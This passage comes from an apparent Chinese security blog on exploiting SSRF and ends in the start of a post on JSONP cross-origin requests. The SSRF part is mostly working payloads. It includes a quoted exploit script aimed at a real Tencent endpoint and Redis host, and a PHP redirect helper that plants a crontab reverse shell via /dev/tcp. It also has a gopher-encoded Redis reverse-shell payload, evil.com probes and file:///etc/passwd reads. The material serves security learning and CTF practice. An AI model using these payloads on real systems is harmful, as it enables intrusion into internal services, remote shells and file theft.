<h3 id="常简存在SSRF漏洞的函数"><a href="#常简存在SSRF漏洞的函数" class="headerlink" title="常简存在SSRF漏洞的函数"></a>常简存在SSRF漏洞的函数</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><p>1.file_get_contents()<br>2.fsockopen()<br>3.curl_exec()   默认不支持302跳转的</p>
<h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><p>1.HttpClient<br>2.Request (对HttpClient封装后的类)<br>3.HttpURLConnection<br>4.URLConnection<br>5.URL<br>6.okhttp<br>以上的几个发送网络请求的类都有可能导致SSRF，但是java的各个类对协议的支持各有不同，所以利用过程首先得确定支持哪些协议。</p>
<h3 id="SSRF支持的协议"><a href="#SSRF支持的协议" class="headerlink" title="SSRF支持的协议"></a>SSRF支持的协议</h3><p>这里协议描述的细一点，也参考了各个文章的trick。因为协议的技巧都是通用的，xxe、文件读取、文件包含等都可能用的上。</p>
<table>
<thead>
<tr>
<th>语言支持协议表</th>
<th>php</th>
<th>Java</th>
<th>curl</th>
<th>Perl</th>
<th>ASP.NET</th>
</tr>
</thead>
<tbody><tr>
<td>http&#x2F;https</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
</tr>
<tr>
<td>gopher</td>
<td>-with-curlwrappers</td>
<td>Before JDK1.7</td>
<td>before 7.49.0 不支持\x00</td>
<td>&amp;radic;</td>
<td>Before version 3</td>
</tr>
<tr>
<td>tftp</td>
<td>-with-curlwrappers</td>
<td>X</td>
<td>before 7.49.0 不支持\x00</td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td>dict</td>
<td>-with-curlwrappers</td>
<td>X</td>
<td>&amp;radic;</td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td>file</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
</tr>
<tr>
<td>ftp</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
</tr>
<tr>
<td>imap</td>
<td>-with-curlwrappers</td>
<td>X</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>X</td>
</tr>
<tr>
<td>pop3</td>
<td>-with-curlwrappers</td>
<td>X</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>X</td>
</tr>
<tr>
<td>rtsp</td>
<td>-with-curlwrappers</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
</tr>
<tr>
<td>smb</td>
<td>-with-curlwrappers</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
<td>&amp;radic;</td>
</tr>
<tr>
<td>smtp</td>
<td>-with-curlwrappers</td>
<td>X</td>
<td>&amp;radic;</td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td>telnet</td>
<td>-with-curlwrappers</td>
<td>X</td>
<td>&amp;radic;</td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td>ssh2</td>
<td>受限于allow_url_fopen</td>
<td>X</td>
<td>X</td>
<td>受限于NET:SSH2</td>
<td>X</td>
</tr>
<tr>
<td>ogg</td>
<td>受限于allow_url_fopen</td>
<td>X</td>
<td>X</td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td>expect</td>
<td>受限于allow_url_fopen</td>
<td>X</td>
<td>X</td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td>ldap</td>
<td>X</td>
<td>X</td>
<td>X</td>
<td>&amp;radic;</td>
<td>X</td>
</tr>
<tr>
<td>php</td>
<td>&amp;radic;</td>
<td>X</td>
<td>X</td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td>zlib&#x2F;bzip&#x2F;zip</td>
<td>受限于allow_url_fopen</td>
<td>X</td>
<td>X</td>
<td>X</td>
<td>X</td>
</tr>
</tbody></table>
<p><strong>SFTP</strong></p>
<p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://test.net/ssrf.php?url=sftp://evil.com:11111/</span><br><span class="line"></span><br><span class="line">evil.com:</span><br><span class="line">$ nc -v -l 11111</span><br><span class="line">Connection from [192.168.0.10] port 11111 [tcp/*] accepted (family 2, sport 36136)SSH-2.0-libssh2_1.4.2</span><br><span class="line"></span><br><span class="line"><span class="comment">#不要天真的以为它是sftp就能传文件到服务器上。</span></span><br></pre></td></tr></table></figure>

<p><strong>DICT</strong></p>
<p>DICT主要用来探测端口和服务是否开启，当然它也可以进行redis的利用，乌云的猪猪侠就有一个经典的SSRF+dict协议+redis未授权 getshell，此外小米也出现过相同的问题，所以DICT协议在SSRF用处还是蛮大的。</p>
<p>判断DICT是否可用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://safebuff.com/ssrf.php?dict://attacker:11111/</span><br><span class="line"></span><br><span class="line">evil.com:$ nc -v -l 11111</span><br><span class="line">Connection from [192.168.0.10] port 11111 [tcp/*] accepted (family 2, sport 36136)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure>

<p>探测端口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#直接dict://ip:port/</span></span><br><span class="line">http://192.168.37.18/ssrf/?url=dict://127.0.0.1:9999</span><br><span class="line"><span class="comment">#一般来说 端口存在 立马响应(多为内置的报错页面，或者对应服务信息) 不存在的端口会延迟响应(多为无法连接) 可以通过已知开放端口的响应结果俩进行区分。</span></span><br></pre></td></tr></table></figure>

<p>使用dict协议向Redis数据库写shell<br>关于dict协议：</p>
<blockquote>
<p><a href="https://links.jianshu.com/go?to=dict://serverip:port/">dict:&#x2F;&#x2F;serverip:port&#x2F;</a>命令:参数<br>向服务器的端口请求 命令:参数，并在末尾自动补上\r\n(CRLF)，为漏洞利用增添了便利</p>
</blockquote>
<p>DICT对redis的利用(引用了腾讯的SSRF漏洞的代码)：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="comment"># email: ringzero@0x557.org</span></span><br><span class="line">import requests</span><br><span class="line">host = <span class="string">&#x27;42.62.67.198&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;6379&#x27;</span></span><br><span class="line">bhost = <span class="string">&#x27;fuzz.wuyun.org&#x27;</span></span><br><span class="line">bport = <span class="string">&#x27;8080&#x27;</span></span><br><span class="line">vul_httpurl = <span class="string">&#x27;http://share.v.t.qq.com/index.php?c=share&amp;a=pageinfo&amp;url=&#x27;</span></span><br><span class="line">_location = <span class="string">&#x27;http://fuzz.wuyun.org/302.php&#x27;</span></span><br><span class="line">shell_location = <span class="string">&#x27;http://fuzz.wuyun.org/shell.php&#x27;</span></span><br><span class="line"><span class="comment">#1 flush db</span></span><br><span class="line">_payload = <span class="string">&#x27;?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=flushall&#x27;</span>.format(</span><br><span class="line">    host = host,</span><br><span class="line">    port = port)</span><br><span class="line">exp_uri = <span class="string">&#x27;&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;%23helo.jpg&#x27;</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="built_in">print</span> exp_uri</span><br><span class="line"><span class="built_in">print</span> requests.get(exp_uri).content</span><br><span class="line"><span class="comment">#2 set crontab command</span></span><br><span class="line">_payload = <span class="string">&#x27;?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26bhost=&#123;bhost&#125;%26bport=&#123;bport&#125;&#x27;</span>.format(</span><br><span class="line">    host = host,</span><br><span class="line">    port = port,</span><br><span class="line">    bhost = bhost,</span><br><span class="line">    bport = bport)</span><br><span class="line">exp_uri = <span class="string">&#x27;&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;%23helo.jpg&#x27;</span>.format(shell_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="built_in">print</span> exp_uri</span><br><span class="line"><span class="built_in">print</span> requests.get(exp_uri).content</span><br><span class="line"><span class="comment">#3 config set dir /var/spool/cron/</span></span><br><span class="line">_payload = <span class="string">&#x27;?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=config:set:dir:/var/spool/cron/&#x27;</span>.format(</span><br><span class="line">    host = host,</span><br><span class="line">    port = port)</span><br><span class="line">exp_uri = <span class="string">&#x27;&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;%23helo.jpg&#x27;</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="built_in">print</span> exp_uri</span><br><span class="line"><span class="built_in">print</span> requests.get(exp_uri).content</span><br><span class="line"><span class="comment">#4 config set dbfilename root</span></span><br><span class="line">_payload = <span class="string">&#x27;?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=config:set:dbfilename:root&#x27;</span>.format(</span><br><span class="line">    host = host,</span><br><span class="line">    port = port)</span><br><span class="line">exp_uri = <span class="string">&#x27;&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;%23helo.jpg&#x27;</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="built_in">print</span> exp_uri</span><br><span class="line"><span class="built_in">print</span> requests.get(exp_uri).content</span><br><span class="line"><span class="comment">#5 save to file</span></span><br><span class="line">_payload = <span class="string">&#x27;?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=save&#x27;</span>.format(</span><br><span class="line">    host = host,</span><br><span class="line">    port = port)</span><br><span class="line">exp_uri = <span class="string">&#x27;&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;%23helo.jpg&#x27;</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="built_in">print</span> exp_uri</span><br><span class="line"><span class="built_in">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#shell.php 辅助脚本</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"><span class="variable">$bhost</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;bhost&#x27;</span>];</span><br><span class="line"><span class="variable">$bport</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;bport&#x27;</span>];</span><br><span class="line"><span class="variable">$scheme</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$scheme</span>://<span class="subst">$ip</span>:<span class="subst">$port</span>/set:0:\&quot;\\x0a\\x0a*/1\\x20*\\x20*\\x20*\\x20*\\x20/bin/bash\\x20-i\\x20&gt;\\x26\\x20/dev/tcp/<span class="subst">&#123;$bhost&#125;</span>/<span class="subst">&#123;$bport&#125;</span>\\x200&gt;\\x261\\x0a\\x0a\\x0a\&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>gopher</strong></p>
<p>这个协议要写的长一点,他是一个TCP&#x2F;IP层协议，所以可以干很多事情，它可以GET请求也可以POST请求,还可以发邮件、攻击mysql、redis、fastcgi等等，总之就是挺强大的。但是记住gopher协议的默认端口是70,所以如果伪造http协议记得写端口。另外推荐一个生成gopher协议payload的工具：<a href="https://github.com/tarunkant/Gopherus">gopherus</a>（注意payload需要URL编码一次，也就是二次编码）</p>
<p>gopher可以进行get和post和其他一些协议的处理,尤其是POST,所以经常用来进行漏洞利用,比如内网的其他网站的攻击,上传文件,POST一些参数等等。gopher协议的格式:<code>gopher:/ip:port/_ + payload</code><br>下面举个例子</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#如果你想要访问一个内网才可以访问的地址</span></span><br><span class="line">http://192.168.37.18/ssrf/?url=gopher://192.168.37.18:80/%20GET%20/index.php</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果你想要POST数据到对应内网网址（回车换行符号要进行2次url编码%250d%250a）</span></span><br><span class="line">http://192.168.34.29/ssrf/index.php?url=gopher://192.168.34.29:80/_POST%20%2fssrf%2fflag.php%20HTTP%2f1.1%250d%250aHost%3A%20192.168.34.29%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aContent-Length%3A%206%250d%250a%250d%250aflag%3D1（在nginx 1.11下POST数据未成功，日志查询POST为两个 - 现在还没找到原因，知道原因的同学可以留言）</span><br><span class="line"></span><br><span class="line"><span class="comment">#其他的不常见payload 你可以用上面我给出的工具进行生成，比如：</span></span><br><span class="line">gopherus --exploit zabbix</span><br><span class="line">gopherus --exploit redis</span><br><span class="line">gopherus --exploit mysql</span><br><span class="line">...</span><br><span class="line">gopher是SSRF中最强大的一个协议，请首先确定该协议是否可用。</span><br></pre></td></tr></table></figure>
<p>gopher为啥特别危险呢？因为他可以被称为万能协议，可以发起其他各种协议的请求，攻击redis、mysql、fastcgi等。<br>比如攻击redis：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 抓取redis反弹那shell的包如下</span></span><br><span class="line">[root@Centos ~]<span class="comment"># socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</span></span><br><span class="line">&gt; 2018/09/25 10:35:24.944863  length=18 from=0 to=17</span><br><span class="line">*1\r</span><br><span class="line"><span class="variable">$8</span>\r</span><br><span class="line">flushall\r</span><br><span class="line">&lt; 2018/09/25 10:35:24.948320  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2018/09/25 10:35:24.955995  length=88 from=0 to=87</span><br><span class="line">*3\r</span><br><span class="line"><span class="variable">$3</span>\r</span><br><span class="line"><span class="built_in">set</span>\r</span><br><span class="line"><span class="variable">$1</span>\r</span><br><span class="line">1\r</span><br><span class="line"><span class="variable">$61</span>\r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.86.131/8080 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\r</span><br><span class="line">&lt; 2018/09/25 10:35:24.956209  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2018/09/25 10:35:24.959588  length=57 from=0 to=56</span><br><span class="line">*4\r</span><br><span class="line"><span class="variable">$6</span>\r</span><br><span class="line">config\r</span><br><span class="line"><span class="variable">$3</span>\r</span><br><span class="line"><span class="built_in">set</span>\r</span><br><span class="line"><span class="variable">$3</span>\r</span><br><span class="line"><span class="built_in">dir</span>\r</span><br><span class="line"><span class="variable">$16</span>\r</span><br><span class="line">/var/spool/cron/\r</span><br><span class="line">&lt; 2018/09/25 10:35:24.960138  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2018/09/25 10:35:24.967473  length=52 from=0 to=51</span><br><span class="line">*4\r</span><br><span class="line"><span class="variable">$6</span>\r</span><br><span class="line">config\r</span><br><span class="line"><span class="variable">$3</span>\r</span><br><span class="line"><span class="built_in">set</span>\r</span><br><span class="line"><span class="variable">$10</span>\r</span><br><span class="line">dbfilename\r</span><br><span class="line"><span class="variable">$4</span>\r</span><br><span class="line">root\r</span><br><span class="line">&lt; 2018/09/25 10:35:24.967772  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2018/09/25 10:35:24.974068  length=14 from=0 to=13</span><br><span class="line">*1\r</span><br><span class="line"><span class="variable">$4</span>\r</span><br><span class="line">save\r</span><br><span class="line">&lt; 2018/09/25 10:35:24.976103  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2018/09/25 10:35:24.983836  length=14 from=0 to=13</span><br><span class="line">*1\r</span><br><span class="line"><span class="variable">$4</span>\r</span><br><span class="line">quit\r</span><br><span class="line">&lt; 2018/09/25 10:35:24.984123  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br></pre></td></tr></table></figure>
<p>引用下JoyChou师傅的转换脚本:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="comment">#author: JoyChou</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">exp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">&#x27;&gt;&lt;+&#x27;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 判断倒数第2、3字符串是否为\r</span></span><br><span class="line">        <span class="keyword">elif</span> line[-<span class="number">3</span>:-<span class="number">1</span>] == <span class="string">r&#x27;\r&#x27;</span>:</span><br><span class="line">            <span class="comment"># 如果该行只有\r，将\r替换成%0a%0d%0a</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(line) == <span class="number">3</span>:</span><br><span class="line">                exp = exp + <span class="string">&#x27;%0a%0d%0a&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line = line.replace(<span class="string">r&#x27;\r&#x27;</span>, <span class="string">&#x27;%0d%0a&#x27;</span>)</span><br><span class="line">                <span class="comment"># 去掉最后的换行符</span></span><br><span class="line">                line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                exp = exp + line</span><br><span class="line">        <span class="comment"># 判断是否是空行，空行替换为%0a</span></span><br><span class="line">        <span class="keyword">elif</span> line == <span class="string">&#x27;\x0a&#x27;</span>:</span><br><span class="line">            exp = exp + <span class="string">&#x27;%0a&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            exp = exp + line</span><br><span class="line"><span class="built_in">print</span> exp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>转换规则如下：</p>
<ul>
<li><p>如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。</p>
</li>
<li><p>如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。</p>
</li>
<li><p>将\r字符串替换成%0d%0a</p>
</li>
<li><p>空白行替换为%0a<br>构造gopher协议利用：<br><em>1%0d%0a$8%0d%0aflushall%0d%0a</em>3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$61%0d%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.86.131&#x2F;8080 0&gt;&amp;1%0a%0a%0a%0d%0a<em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a</em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a<em>1%0d%0a$4%0d%0asave%0d%0a</em>1%0d%0a$4%0d%0aquit%0d%0a<br>如果要换IP和端口，前面的$61也需要更改，$61表示字符串长度为61个字节，上面的EXP即是%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.86.131&#x2F;8080 0&gt;&amp;1%0a%0a%0a%0a，3+54+4&#x3D;58。<br>本地curl测试，返回4个OK说明成功执行</p>
</li>
</ul>
<p><strong>file</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/?url=file:///etc/passwd</span><br><span class="line">http://192.168.37.18/ssrf/?url=file:///E:/readme.txt</span><br></pre></td></tr></table></figure>

<p><strong>ldap</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://safebuff.com/redirect.php?url=ldap://localhost:11211/%0astats%0aquit</span><br></pre></td></tr></table></figure>

<p><strong>TFTP</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://safebuff.com/ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET</span><br><span class="line"></span><br><span class="line">evil.com:</span><br><span class="line"><span class="comment"># nc -v -u -l 12346Listening on [0.0.0.0] (family 0, port 12346)TESTUDPPACKEToctettsize0blksize512timeout6</span></span><br></pre></td></tr></table></figure>

<h3 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><p>1.利用302跳转绕过协议限制</p>
<p>2.127 段全部都是本地地址 绕过对127.0.0.1的限制</p>
<p>3.工具探测-&gt;<a href="https://github.com/swisskyrepo/SSRFmap">ssrfmap</a></p>
<h3 id="CTF技巧"><a href="#CTF技巧" class="headerlink" title="CTF技巧"></a>CTF技巧</h3><h5 id="php中的parse-url和libcurl"><a href="#php中的parse-url和libcurl" class="headerlink" title="php中的parse_url和libcurl"></a>php中的parse_url和libcurl</h5><p>题目（一个SSRF利用mysql的题目）不放了，这里也不是写CTF解题过程的，大概代码流程：</p>
<p><code>url-&gt;php parse_url（过滤ip）-&gt;过滤url各部分(空白字符和数字)-&gt;curl发送请求</code></p>
<p>可利用parse_url和libcurl对url解析的差异来绕过。</p>
<p>完整url: <code>bash scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment] </code><br>这里仅讨论url中不含’?’的情况</p>
<p>php parse_url：<br>host: 匹配最后一个@后面符合格式的host</p>
<p>libcurl：<br>host：匹配第一个@后面符合格式的host</p>
<p>如：<a href="http://u:p%40a.com%3A80@b.com/">http://u:p@a.com:80@b.com/</a></p>
<p>php解析结果：<br>    schema: http<br>    host: b.com<br>    user: u<br>    pass: <a href="mailto:&#x70;&#x40;&#x61;&#x2e;&#x63;&#111;&#109;">&#x70;&#x40;&#x61;&#x2e;&#x63;&#111;&#109;</a>:80<br>libcurl解析结果：<br>    schema: http<br>    host: a.com<br>    user: u<br>    pass: p<br>    port: 80<br>    后面的@b.com&#x2F;会被忽略掉</p>
<p>我们可以构造一个URL地址，用来让php认为host是b.com 而libcurl实际请求另一个域名。</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//u</span>:p:@a.com:<span class="number">3306</span>@b.com/</span><br><span class="line">http:<span class="regexp">//u</span>:@a.com:<span class="number">3306</span>@b.com/</span><br></pre></td></tr></table></figure>
<p>但是这里还有一个问题，开头流程中说明了php解析URL后会过滤空白字符和数字。数字会被过滤，所以，a.com:3306是不行的，3306只能放在最后，但是放在最后端口就无法被curl获取到，但是根据rfc3986规定可以：<br>gopher:&#x2F;&#x2F;foo@[cafebabe.cf]@yolo.com:3306</p>
<blockquote>
<p>A host identified by an Internet Protocol literal address, version 6 or later, is distinguished by enclosing the IP literal within square brackets (“[“ and “]“). This is the only place where square bracket characters are allowed in the URI syntax.<br>IP-literal &#x3D; “[“ ( IPv6address &#x2F; IPvFuture ) “]”<br>也就是说[ip]是一种host的形式，libcurl在解析时候认为[]包裹的是host</p>
</blockquote>
<p>还有一种十六进制表现形式<br>gopher:&#x2F;&#x2F;foo@localhost:<a href="mailto:&#x66;&#64;&#x72;&#x69;&#x63;&#116;&#x65;&#x72;&#x7a;&#x2e;&#109;&#101;">&#x66;&#64;&#x72;&#x69;&#x63;&#116;&#x65;&#x72;&#x7a;&#x2e;&#109;&#101;</a>:3306&#x2F;</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul>
<li><a href="http://tools.40huo.cn/#!papers.md">《Build Your SSRF EXP Autowork》猪猪侠</a></li>
<li><a href="https://_thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de_.html">腾讯某处 SSRF 漏洞（非常好的利用点）附利用脚本</a></li>
<li><a href="https://_thorns.gitbooks.io/sec/content/bilibilimou_fen_zhan_cong_xin_xi_xie_lu_dao_ssrf_z.html">bilibili 某分站从信息泄露到 ssrf 再到命令执行</a></li>
<li><a href="https://www.freebuf.com/articles/web/159342.html">从一道CTF题目看Gopher攻击Mysql</a></li>
<li><a href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/">gopher在ssrf中攻击内网的示例</a></li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器跨域的几种实现</title>
    <url>//posts/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%B7%A8%E5%9F%9F%E7%9A%84%E5%87%A0%E7%A7%8D%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>同源策略是浏览器安全策略的核心，非同源不得交互，但是有时候一家公司有自己的不同业务，不同的子域名，或者说有合作方，不同的域名端口需要交互数据呢。这就是跨域的需求。</p>
<p>跨域目前一般常见两种方式：Jsonp、CORS、代理。</p>
<h2 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h2><p>js在script标签中是不受同源策略限制的，我们也经常能看到<code>&lt;script src=&quot;http://xxx.xxx.xx.x/xxx.js&quot;&gt;</code>，当然img也不受限制，但是img不太好做后续数据的处理。</p>
<p>jsonp的核心是在前端动态创建一个script标签。并设置src属性指向跨域的服务器。服务器返回包含json数据的javascript函数。前端接受到对应函数和对应的数据，直接执行处理就拿到了我们想调用接口拿到的数据。</p>
<p><strong>demo</strong></p>
<p>我们实现一个demo，后端用我比较熟悉的Flask</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设这是一个返回JSONP响应的服务端点</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/jsonp&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jsonp_demo</span>():</span><br><span class="line">    <span class="comment"># 获得客户端传递的回调函数名称</span></span><br><span class="line">    callback = request.args.get(<span class="string">&#x27;callback&#x27;</span>, <span class="string">&#x27;callbackFunction&#x27;</span>)</span><br><span class="line">    data = &#123;<span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;Alice&#x27;</span>, <span class="string">&#x27;id&#x27;</span>: <span class="number">123</span>&#125;  <span class="comment"># 这里是我们想要传递给客户端的数据</span></span><br><span class="line">    response = <span class="string">f&quot;<span class="subst">&#123;callback&#125;</span>(<span class="subst">&#123;data&#125;</span>)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>如果有浏览器访问&#x2F;jsonp接口就会获取回调函数的名称，然后把这个接口需要传递的数据封装进去。然后前端代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP Demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 定义处理JSONP响应的回调函数</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">handleJSONPResponse</span>(<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Received data:&#x27;</span>, data);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        // 动态添加<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">标签进行跨域请求</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">        <span class="keyword">function</span> <span class="title function_">requestJSONP</span>(<span class="params">url, callbackName</span>) &#123;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">            <span class="keyword">var</span> scriptTag = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">            scriptTag.<span 